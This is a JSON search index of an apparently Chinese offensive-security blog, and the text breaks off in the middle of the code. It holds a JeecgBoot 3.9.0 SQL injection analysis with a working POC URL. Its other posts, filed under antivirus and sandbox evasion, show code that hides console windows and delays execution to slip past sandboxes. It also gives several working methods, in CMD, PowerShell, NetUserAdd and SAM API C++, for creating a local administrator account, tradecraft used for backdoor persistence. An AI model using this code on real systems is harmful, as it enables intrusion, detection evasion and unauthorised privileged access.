[{"id":0,"href":"/posts/2026/01/java-sql-injection/","title":"Sql注入","section":"java","content":" 常见基本SQL语句# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 -- 查询users表所有列 SELECT * FROM users; -- 查询users表特定列：id, username, email SELECT id, username, email FROM users; -- 带条件查询 SELECT * FROM users WHERE id = 1; SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39; AND status = 1; -- 模糊查询 -- 查询名字以 \u0026#39;admin\u0026#39; 开头的用户 SELECT * FROM users WHERE username LIKE \u0026#39;admin%\u0026#39;; -- 查询名字包含 \u0026#39;test\u0026#39; 的用户 SELECT * FROM users WHERE username LIKE \u0026#39;%test%\u0026#39;; -- 排序 (ORDER BY) -- 按 ID 升序 SELECT * FROM users ORDER BY id ASC; -- 按创建时间降序 SELECT * FROM users ORDER BY create_time DESC; -- 聚合函数 -- 统计总行数 SELECT COUNT(*) FROM users; -- 计算平均值 SELECT AVG(age) FROM users; -- 分组统计 SELECT role, COUNT(*) FROM users GROUP BY role; -- 联合查询 (UNION) SELECT id, username FROM users UNION SELECT 1, database(); -- 插入数据 (INSERT) -- 插入单条数据 INSERT INTO users (username, password, email) VALUES (\u0026#39;test_user\u0026#39;, \u0026#39;123456\u0026#39;, \u0026#39;test@example.com\u0026#39;); -- 插入多条数据 INSERT INTO users (username, password) VALUES (\u0026#39;user1\u0026#39;, \u0026#39;pass1\u0026#39;), (\u0026#39;user2\u0026#39;, \u0026#39;pass2\u0026#39;); -- 更新数据 (UPDATE) 注意：一定要带 WHERE 条件，否则会更新整张表 -- 更新特定用户的密码 UPDATE users SET password = \u0026#39;new_password\u0026#39; WHERE id = 10; -- 同时更新多个字段 UPDATE users SET status = 0, update_time = NOW() WHERE username = \u0026#39;admin\u0026#39;; -- 删除数据 (DELETE) 注意：一定要带 WHERE 条件，否则会清空整张表 -- 删除特定 ID 的记录 DELETE FROM users WHERE id = 5; -- 删除状态为禁用的用户 DELETE FROM users WHERE status = -1; Mybatis框架# #{} 用于预编译的 SQL 语句中，是预编译处理（安全）。 ${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。 Mybatis Plus框架# 审计MyBatis Plus框架中的SQL注入问题，核心在于识别动态SQL拼接的场景。\n在 MyBatis/MyBatis Plus 中，MyBatis Plus 完全兼容 MyBatis的语法：\n#{} 用于预编译的 SQL 语句中，是预编译处理（安全）。 ${} 则用于动态 SQL 语句中，是直接字符串替换（危险），字符串拼接。 语法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;mapper namespace=\u0026#34;com.example.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;!-- 增加：useGeneratedKeys 获取自增主键 --\u0026gt; INSERT INTO users (name, email) VALUES (#{name}, #{email}) \u0026lt;/insert\u0026gt; \u0026lt;!-- 删除 --\u0026gt; \u0026lt;delete id=\u0026#34;deleteUserById\u0026#34; parameterType=\u0026#34;int\u0026#34;\u0026gt; DELETE FROM users WHERE id = #{id} \u0026lt;/delete\u0026gt; \u0026lt;!-- 修改 --\u0026gt; UPDATE users SET name = #{name}, email = #{email} WHERE id = #{id} \u0026lt;/update\u0026gt; \u0026lt;!-- 查询：resultType 指定返回类型 --\u0026gt; SELECT * FROM users WHERE id = #{id} \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; JeecgBoot 3.9.0 /sys/dict/loadTreeData tableName参数SQL 注入# SysDictController.java ， loadTreeData 接口直接接收了前端传来的 tableName 参数。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 /** * 查询数据 查出所有部门,并以树结构数据格式响应给前端 * * @return */ @RequestMapping(value = \u0026#34;/queryTreeList\u0026#34;, method = RequestMethod.GET) public Result\u0026lt;List\u0026lt;SysDepartTreeModel\u0026gt;\u0026gt; queryTreeList(@RequestParam(name = \u0026#34;ids\u0026#34;, required = false) String ids) { Result\u0026lt;List\u0026lt;SysDepartTreeModel\u0026gt;\u0026gt; result = new Result\u0026lt;\u0026gt;(); try { // 从内存中读取 //\tList\u0026lt;SysDepartTreeModel\u0026gt; list =FindsDepartsChildrenUtil.getSysDepartTreeList(); //\tif (CollectionUtils.isEmpty(list)) { //\tlist = sysDepartService.queryTreeList(); //\t} if(oConvertUtils.isNotEmpty(ids)){ List\u0026lt;SysDepartTreeModel\u0026gt; departList = sysDepartService.queryTreeList(ids); result.setResult(departList); }else{ List\u0026lt;SysDepartTreeModel\u0026gt; list = sysDepartService.queryTreeList(); result.setResult(list); } result.setSuccess(true); } catch (Exception e) { log.error(e.getMessage(),e); } return result; } 处理 (Service 层) 在 SysDictServiceImpl.java 的 queryTreeList 方法中\n有一段逻辑专门用来分隔 tableName ：String[] arr = table.split(\u0026quot; (?i)where \u0026quot;);\n由于一系列操作导致注入语句可以被赋值给filterSql：filterSql = oConvertUtils.getString(arr[1], null)；\n然后会进行SQL检测：SqlInjectionUtil.specialFilterContentForDictSql(filterSql);\nprivate static String specialDictSqlXssStr = \u0026quot;exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|+|--\u0026quot;;\n这个filterSql又被放入：queryParams Map中queryParams.put(\u0026quot;_tableFilterSql\u0026quot;, filterSql);\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 @Override public List\u0026lt;TreeSelectModel\u0026gt; queryTreeList(Map\u0026lt;String, String\u0026gt; query, String table, String text, String code, String pidField, String pid, String hasChildField, int converIsLeafVal) { //为了防止sql（jeecg提供了防注入的方法，可以在拼接 SQL 语句时自动对参数进行转义，避免SQL注入攻击） // 1.针对采用 ${}写法的表名和字段进行转义和check //update-begin---author:chenrui ---date:20251015 for：[QQYUN-13741]【客户问题 南自】online表单自定义树 表后边加条件时 不生效------------ // 分割SQL获取表名和条件 String filterSql = null; if(table.toLowerCase().indexOf(DataBaseConstant.SQL_WHERE)\u0026gt;0){ String[] arr = table.split(\u0026#34; (?i)where \u0026#34;); table = arr[0]; filterSql = oConvertUtils.getString(arr[1], null); } table = SqlInjectionUtil.getSqlInjectTableName(table); text = SqlInjectionUtil.getSqlInjectField(text); code = SqlInjectionUtil.getSqlInjectField(code); pidField = SqlInjectionUtil.getSqlInjectField(pidField); hasChildField = SqlInjectionUtil.getSqlInjectField(hasChildField); if(oConvertUtils.isEmpty(text) || oConvertUtils.isEmpty(code)){ log.warn(\u0026#34;text={}，code={}\u0026#34;, text, code); log.warn(\u0026#34;加载树字典参数有误，text和code不允许为空！\u0026#34;); return null; } // 2.检测最终SQL是否存在SQL注入风险 String dictCode = table + \u0026#34;,\u0026#34; + text + \u0026#34;,\u0026#34; + code; SqlInjectionUtil.filterContentMulti(dictCode); SqlInjectionUtil.specialFilterContentForDictSql(filterSql); // 【QQYUN-6533】表字典白名单check sysBaseAPI.dictTableWhiteListCheckByDict(table, text, code); // 3.表字典SQL表名黑名单 Check if(!dictQueryBlackListHandler.isPass(dictCode)){ log.error(\u0026#34;Sql异常：{}\u0026#34;, dictQueryBlackListHandler.getError()); return null; } // 4.检测查询条件是否存在SQL注入 Map\u0026lt;String, String\u0026gt; queryParams = queryParams = new HashMap\u0026lt;\u0026gt;(4); if (query != null) { for (Map.Entry\u0026lt;String, String\u0026gt; searchItem : query.entrySet()) { String fieldName = searchItem.getKey(); queryParams.put(SqlInjectionUtil.getSqlInjectField(fieldName), searchItem.getValue()); } } // 代码逻辑说明: [QQYUN-13741]【客户问题 南自】online表单自定义树 表后边加条件时 不生效------------ if(oConvertUtils.isNotEmpty(filterSql)){ queryParams.put(\u0026#34;_tableFilterSql\u0026#34;, filterSql); } return baseMapper.queryTreeList(queryParams, table, text, code, pidField, pid, hasChildField, converIsLeafVal); } 最后在 XML 中，MyBatis 使用 ${} 直接执行了_tableFilterSql\n1 2 3 \u0026lt;when test=\u0026#34;key == \u0026#39;_tableFilterSql\u0026#39;\u0026#34;\u0026gt; and ${value} \u0026lt;!-- 这里执行的就是 filterSql 的内容 --\u0026gt; \u0026lt;/when\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;select id=\u0026#34;queryTreeList\u0026#34; parameterType=\u0026#34;Object\u0026#34; resultType=\u0026#34;org.jeecg.modules.system.model.TreeSelectModel\u0026#34;\u0026gt; select ${text} as \u0026#34;title\u0026#34;, ${code} as \u0026#34;key\u0026#34;, \u0026lt;if test=\u0026#34;hasChildField != null and hasChildField != \u0026#39;\u0026#39;\u0026#34;\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;converIsLeafVal!=null and converIsLeafVal==1\u0026#34;\u0026gt; (case when ${hasChildField} = \u0026#39;1\u0026#39; then 0 else 1 end) as isLeaf, \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; ${hasChildField} as isLeaf, \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/if\u0026gt; ${pidField} as parentId from ${table} where \u0026lt;!-- 父ID条件 --\u0026gt; \u0026lt;if test=\u0026#34;query == null\u0026#34;\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;pid != null and pid != \u0026#39;\u0026#39;\u0026#34;\u0026gt; ${pidField} = #{pid} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; (${pidField} = \u0026#39;\u0026#39; OR ${pidField} IS NULL) \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/if\u0026gt; \u0026lt;!-- 查询条件组装 --\u0026gt; \u0026lt;if test=\u0026#34;query!= null\u0026#34;\u0026gt; 1 = 1 \u0026lt;foreach collection=\u0026#34;query.entrySet()\u0026#34; item=\u0026#34;value\u0026#34; index=\u0026#34;key\u0026#34; \u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;key == \u0026#39;tenant_id\u0026#39;\u0026#34;\u0026gt; and tenant_id = #{value} \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;key == \u0026#39;_tableFilterSql\u0026#39;\u0026#34;\u0026gt; and ${value} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; and ${key} LIKE #{value} \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/foreach\u0026gt; \u0026lt;!-- 【issues/3709】自定义树查询条件没有处理父ID，没有树状结构了 --\u0026gt; \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;pid != null and pid != \u0026#39;\u0026#39;\u0026#34;\u0026gt; and ${pidField} = #{pid} \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; and (${pidField} = \u0026#39;\u0026#39; OR ${pidField} IS NULL) \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; POC\n1 http://127.0.0.1:8080/sys/dict/loadTreeData?tableName=sys_user where 1=1 and length(database())\u0026gt;0 JDBC 框架# "},{"id":1,"href":"/posts/2026/01/ai-security/","title":"AI 安全","section":"AI","content":" "},{"id":2,"href":"/posts/2026/01/hide-console-window/","title":"隐藏控制台窗口","section":"免杀\u0026Tip","content":" #pragma comment 指令# 1 2 3 4 5 6 7 #pragma comment(linker, \u0026#34;/subsystem:\\\u0026#34;windows\\\u0026#34; /entry:\\\u0026#34;mainCRTStartup\\\u0026#34;\u0026#34;) #include \u0026lt;windows.h\u0026gt; int main() { MessageBoxA(0, \u0026#34;弹窗！\u0026#34;, \u0026#34;Test\u0026#34;, 0); return 0; } ShowWindow# 1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;windows.h\u0026gt; int main() { // 获取控制台窗口句柄 HWND hWnd = GetConsoleWindow(); // 隐藏 ShowWindow(hWnd, SW_HIDE); MessageBoxA(0, \u0026#34;弹窗！\u0026#34;, \u0026#34;Test\u0026#34;, 0); return 0; } FreeConsole# 1 2 3 4 5 6 7 8 9 #include \u0026lt;windows.h\u0026gt; int main() { // 释放控制台资源 FreeConsole(); MessageBoxA(0, \u0026#34;弹窗！\u0026#34;, \u0026#34;Test\u0026#34;, 0); return 0; } "},{"id":3,"href":"/posts/2026/01/delay-execution/","title":"延迟执行","section":"沙箱绕过","content":" Sleep()# 1 2 3 4 5 6 7 8 #include \u0026lt;windows.h\u0026gt; int main() { // 单位是毫秒 Sleep(5000); MessageBoxA(NULL, \u0026#34;Hello!\u0026#34;, \u0026#34;Success\u0026#34;, MB_OK); return 0; } WaitForSingleObject# 1 2 3 4 5 6 7 8 9 10 #include \u0026lt;windows.h\u0026gt; int main() { WaitForSingleObject(GetCurrentProcess(), 5000); MessageBoxA(NULL, \u0026#34;5秒钟\u0026#34;,\u0026#34;test\u0026#34;, MB_OK | MB_ICONINFORMATION); return 0; } IcmpSendEcho# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;windows.h\u0026gt; #include \u0026lt;iphlpapi.h\u0026gt; #include \u0026lt;icmpapi.h\u0026gt; #include \u0026lt;iostream\u0026gt; #pragma comment(lib, \u0026#34;iphlpapi.lib\u0026#34;) #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) int main() { HANDLE hIcmp = IcmpCreateFile(); // 构造一个不存在的 IP 地址 (例如 1.1.1.1) IPAddr targetIp = inet_addr(\u0026#34;192.0.2.1\u0026#34;); char sendData[] = \u0026#34;test\u0026#34;; LPVOID replyBuffer = (VOID*)malloc(sizeof(ICMP_ECHO_REPLY) + sizeof(sendData)); // 设置超时时间为 5000 毫秒 IcmpSendEcho(hIcmp, targetIp, sendData, sizeof(sendData), NULL, replyBuffer, sizeof(ICMP_ECHO_REPLY) + sizeof(sendData), 5000); std::cout \u0026lt;\u0026lt; \u0026#34;5 seconds passed.\u0026#34; \u0026lt;\u0026lt; std::endl; free(replyBuffer); IcmpCloseHandle(hIcmp); MessageBoxA(NULL, \u0026#34;5 seconds passed.\u0026#34;, \u0026#34;Info\u0026#34;, MB_OK); return 0; } Select (Socket 超时)# 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;iostream\u0026gt; #pragma comment(lib, \u0026#34;ws2_32.lib\u0026#34;) int main() { // 1. 初始化 WSADATA wsaData; WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); // 2. 创建一个占位 Socket SOCKET dummy = socket(AF_INET, SOCK_STREAM, 0); FD_SET readfds; FD_ZERO(\u0026amp;readfds); FD_SET(dummy, \u0026amp;readfds); // 3. 设置时间 TIMEVAL tv; tv.tv_sec = 5; tv.tv_usec = 0; // 4. 执行延时 select(0, \u0026amp;readfds, NULL, NULL, \u0026amp;tv); // 5. 清理 closesocket(dummy); WSACleanup(); std::cout \u0026lt;\u0026lt; \u0026#34;[*] 5 seconds passed.\u0026#34; \u0026lt;\u0026lt; std::endl; MessageBoxA(NULL, \u0026#34;延时成功！\u0026#34;, \u0026#34;Test\u0026#34;, MB_OK); return 0; } "},{"id":4,"href":"/posts/2026/01/windows-add-user/","title":"Windows添加用户","section":"免杀\u0026Tip","content":" CMD# 1 2 net user admin 123456 /add net localgroup Administrators admin /add Powershell# 1 2 3 $Password = ConvertTo-SecureString \u0026#34;P@ssw0rd123\u0026#34; -AsPlainText -Force New-LocalUser -Name \u0026#34;admin\u0026#34; -Password $Password -Description \u0026#34;Admin User\u0026#34; Add-LocalGroupMember -Group \u0026#34;Administrators\u0026#34; -Member \u0026#34;admin\u0026#34; 1 2 3 4 5 6 7 $computer = [ADSI]\u0026#34;WinNT://$env:COMPUTERNAME\u0026#34; $user = $computer.Create(\u0026#34;User\u0026#34;, \u0026#34;test\u0026#34;) $user.SetPassword(\u0026#34;P@ssw0rd123\u0026#34;) $user.SetInfo() $group = [ADSI]\u0026#34;WinNT://$env:COMPUTERNAME/Administrators,group\u0026#34; $group.Add($user.Path) 1 2 3 4 5 6 7 8 Add-Type -AssemblyName System.DirectoryServices $computer = [ADSI]\u0026#34;WinNT://localhost\u0026#34; $user = $computer.Children.Add(\u0026#34;admin\u0026#34;, \u0026#34;user\u0026#34;) $user.Invoke(\u0026#34;SetPassword\u0026#34;, \u0026#34;P@ssw0rd123\u0026#34;) $user.CommitChanges() $group = [ADSI]\u0026#34;WinNT://localhost/Administrators,group\u0026#34; $group.Invoke(\u0026#34;Add\u0026#34;, $user.Path) NetUserAdd# 参考https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #ifndef UNICODE #define UNICODE #endif #pragma comment(lib, \u0026#34;netapi32.lib\u0026#34;) #include \u0026lt;windows.h\u0026gt; #include \u0026lt;lm.h\u0026gt; int wmain() { USER_INFO_1 ui = {0}; ui.usri1_name = (wchar_t*)L\u0026#34;admin\u0026#34;; // 用户名 ui.usri1_password = (wchar_t*)L\u0026#34;P@ssw0rd123!\u0026#34;; // 密码 ui.usri1_priv = USER_PRIV_USER; ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD; //创建用户 NetUserAdd(NULL, 1, (LPBYTE)\u0026amp;ui, NULL); //添加到管理员组 LOCALGROUP_MEMBERS_INFO_3 account; account.lgrmi3_domainandname = ui.usri1_name; NetLocalGroupAddMembers(NULL, (LPCWSTR)L\u0026#34;Administrators\u0026#34;, 3, (LPBYTE)\u0026amp;account, 1); return 0; } SamAddUser# https://doxygen.reactos.org/d2/d5b/dll_2win32_2netapi32_2user_8c_source.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;windows.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;wchar.h\u0026gt; #pragma comment(lib, \u0026#34;samlib.lib\u0026#34;) #pragma comment(lib, \u0026#34;advapi32.lib\u0026#34;) typedef PVOID SAM_HANDLE; #ifndef USER_NORMAL_ACCOUNT #define USER_NORMAL_ACCOUNT 0x10 #endif typedef enum _USER_INFORMATION_CLASS { UserGeneralInformation = 1, UserSetPasswordInformation = 15, UserControlInformation = 16, UserInternal1Information = 18 } USER_INFORMATION_CLASS; typedef struct _SAM_USER_SET_PASSWORD_INFORMATION { UNICODE_STRING Password; BOOLEAN PasswordExpired; } SAM_USER_SET_PASSWORD_INFORMATION, *PSAM_USER_SET_PASSWORD_INFORMATION; typedef struct _SAM_USER_CONTROL_INFORMATION { ULONG UserAccountControl; } SAM_USER_CONTROL_INFORMATION, *PSAM_USER_CONTROL_INFORMATION; extern \u0026#34;C\u0026#34; { NTSTATUS NTAPI SamConnect(PUNICODE_STRING ServerName, SAM_HANDLE* ServerHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes); NTSTATUS NTAPI SamOpenDomain(SAM_HANDLE ServerHandle, ACCESS_MASK DesiredAccess, PSID DomainId, SAM_HANDLE* DomainHandle); NTSTATUS NTAPI SamCreateUser2InDomain(SAM_HANDLE DomainHandle, PUNICODE_STRING AccountName, ULONG AccountType, ACCESS_MASK DesiredAccess, SAM_HANDLE* UserHandle, PULONG GrantedAccess, PULONG RelativeId); NTSTATUS NTAPI SamLookupNamesInDomain(SAM_HANDLE DomainHandle, ULONG Count, PUNICODE_STRING Names, PULONG* RelativeIds, PULONG* Use); NTSTATUS NTAPI SamOpenUser(SAM_HANDLE DomainHandle, ACCESS_MASK DesiredAccess, ULONG UserId, SAM_HANDLE* UserHandle); NTSTATUS NTAPI SamSetInformationUser(SAM_HANDLE UserHandle, USER_INFORMATION_CLASS UserInformationClass, PVOID Buffer); NTSTATUS NTAPI SamOpenAlias(SAM_HANDLE DomainHandle, ACCESS_MASK DesiredAccess, ULONG AliasId, SAM_HANDLE* AliasHandle); NTSTATUS NTAPI SamAddMemberToAlias(SAM_HANDLE AliasHandle, PSID MemberId); NTSTATUS NTAPI SamCloseHandle(SAM_HANDLE SamHandle); NTSTATUS NTAPI SamFreeMemory(PVOID Buffer); } void InitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) { if (SourceString) { DestinationString-\u0026gt;Buffer = (PWSTR)SourceString; DestinationString-\u0026gt;Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR)); DestinationString-\u0026gt;MaximumLength = DestinationString-\u0026gt;Length + sizeof(WCHAR); } else { DestinationString-\u0026gt;Buffer = NULL; DestinationString-\u0026gt;Length = 0; DestinationString-\u0026gt;MaximumLength = 0; } } bool GetAccountDomainSid(PSID* ppSid) { HANDLE token = NULL; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, \u0026amp;token)) { return false; } DWORD tokenSize = 0; GetTokenInformation(token, TokenUser, NULL, 0, \u0026amp;tokenSize); if (tokenSize == 0) { CloseHandle(token); return false; } PTOKEN_USER tokenUser = (PTOKEN_USER)HeapAlloc(GetProcessHeap(), 0, tokenSize); if (!tokenUser) { CloseHandle(token); return false; } if (!GetTokenInformation(token, TokenUser, tokenUser, tokenSize, \u0026amp;tokenSize)) { HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } DWORD domainSidSize = 0; GetWindowsAccountDomainSid(tokenUser-\u0026gt;User.Sid, NULL, \u0026amp;domainSidSize); if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || domainSidSize == 0) { HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } PSID domainSid = HeapAlloc(GetProcessHeap(), 0, domainSidSize); if (!domainSid) { HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } if (!GetWindowsAccountDomainSid(tokenUser-\u0026gt;User.Sid, domainSid, \u0026amp;domainSidSize)) { HeapFree(GetProcessHeap(), 0, domainSid); HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return false; } *ppSid = domainSid; HeapFree(GetProcessHeap(), 0, tokenUser); CloseHandle(token); return true; } int main() { NTSTATUS status; SAM_HANDLE hSam = NULL; SAM_HANDLE hDomain = NULL; SAM_HANDLE hUser = NULL; SAM_HANDLE hBuiltinDomain = NULL; SAM_HANDLE hAlias = NULL; OBJECT_ATTRIBUTES ObjectAttributes = { 0 }; InitializeObjectAttributes(\u0026amp;ObjectAttributes, NULL, 0, NULL, NULL); UNICODE_STRING uUsername; InitUnicodeString(\u0026amp;uUsername, L\u0026#34;Admin\u0026#34;); std::cout \u0026lt;\u0026lt; \u0026#34;[*] Connecting to SAM...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamConnect(NULL, \u0026amp;hSam, MAXIMUM_ALLOWED, \u0026amp;ObjectAttributes); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamConnect failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; return 1; } PSID pAccountSid = NULL; if (!GetAccountDomainSid(\u0026amp;pAccountSid)) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to get Account Domain SID\u0026#34; \u0026lt;\u0026lt; std::endl; SamCloseHandle(hSam); return 1; } std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening Account Domain...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamOpenDomain(hSam, MAXIMUM_ALLOWED, pAccountSid, \u0026amp;hDomain); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamOpenDomain (Account) failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; return 1; } std::cout \u0026lt;\u0026lt; \u0026#34;[*] Creating user \u0026#39;\u0026#39;...\u0026#34; \u0026lt;\u0026lt; std::endl; ULONG grantedAccess; ULONG userRid; status = SamCreateUser2InDomain(hDomain, \u0026amp;uUsername, USER_NORMAL_ACCOUNT, MAXIMUM_ALLOWED, \u0026amp;hUser, \u0026amp;grantedAccess, \u0026amp;userRid); bool hasUserRid = false; if (status == 0xC0000035) { std::cout \u0026lt;\u0026lt; \u0026#34;[!] User already exists. Proceeding to add to group.\u0026#34; \u0026lt;\u0026lt; std::endl; } else if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamCreateUser2InDomain failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; return 1; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] User created. RID: \u0026#34; \u0026lt;\u0026lt; userRid \u0026lt;\u0026lt; std::endl; SamCloseHandle(hUser); hasUserRid = true; } if (!hasUserRid) { PULONG rids = NULL; PULONG uses = NULL; status = SamLookupNamesInDomain(hDomain, 1, \u0026amp;uUsername, \u0026amp;rids, \u0026amp;uses); if (status \u0026lt; 0 || rids == NULL) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] SamLookupNamesInDomain failed: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; SamCloseHandle(hDomain); SamCloseHandle(hSam); HeapFree(GetProcessHeap(), 0, pAccountSid); return 1; } userRid = rids[0]; hasUserRid = true; SamFreeMemory(rids); SamFreeMemory(uses); } if (hasUserRid) { // Open user to set password and enable account if (status == 0xC0000035 || status \u0026gt;= 0) { // If created or exists std::cout \u0026lt;\u0026lt; \u0026#34;[*] Opening user to set password and enable account...\u0026#34; \u0026lt;\u0026lt; std::endl; // Use userRid to open user status = SamOpenUser(hDomain, MAXIMUM_ALLOWED, userRid, \u0026amp;hUser); if (status \u0026gt;= 0) { // 1. Set Password UNICODE_STRING uPassword; InitUnicodeString(\u0026amp;uPassword, L\u0026#34;Password123!\u0026#34;); SAM_USER_SET_PASSWORD_INFORMATION pwdInfo; pwdInfo.Password = uPassword; pwdInfo.PasswordExpired = FALSE; std::cout \u0026lt;\u0026lt; \u0026#34;[*] Setting password...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamSetInformationUser(hUser, UserSetPasswordInformation, \u0026amp;pwdInfo); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to set password: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] Password set successfully.\u0026#34; \u0026lt;\u0026lt; std::endl; } // 2. Enable Account SAM_USER_CONTROL_INFORMATION controlInfo; controlInfo.UserAccountControl = USER_NORMAL_ACCOUNT | 0x10000; // USER_DONT_EXPIRE_PASSWORD // Ensure we don\u0026#39;t accidentally disable it (UF_ACCOUNTDISABLE is 0x0002) std::cout \u0026lt;\u0026lt; \u0026#34;[*] Enabling account...\u0026#34; \u0026lt;\u0026lt; std::endl; status = SamSetInformationUser(hUser, UserControlInformation, \u0026amp;controlInfo); if (status \u0026lt; 0) { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to enable account: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } else { std::cout \u0026lt;\u0026lt; \u0026#34;[+] Account enabled.\u0026#34; \u0026lt;\u0026lt; std::endl; } SamCloseHandle(hUser); } else { std::cerr \u0026lt;\u0026lt; \u0026#34;[-] Failed to open user: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; status \u0026lt;\u0026lt; std::endl; } } UCHAR subAuthCount = *GetSidSubAuthorityCount(pAccountSid); ULONG sidLength = GetSidLengthRequired(subAuthCount + 1); PSID pUserSid = HeapAlloc(GetProcessHeap(), 0, sidLength); InitializeSid(pUserSid, GetSidIdentifierAuthority(pAccountSid), subAuthCount + 1); for (UCHAR i = 0; i \u0026lt; subAuthCount; i++) { *GetSidSubAuthority(pUserSid, i) = *GetSidSubAuthority(pAccountSid, i); } *GetSidSubAuthority(pUserSid, subAuthCount) = userRid; PSID pBuiltinSid = NULL; SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY; AllocateAndInitializeSid(\u0026amp;NtAuthority, 1, 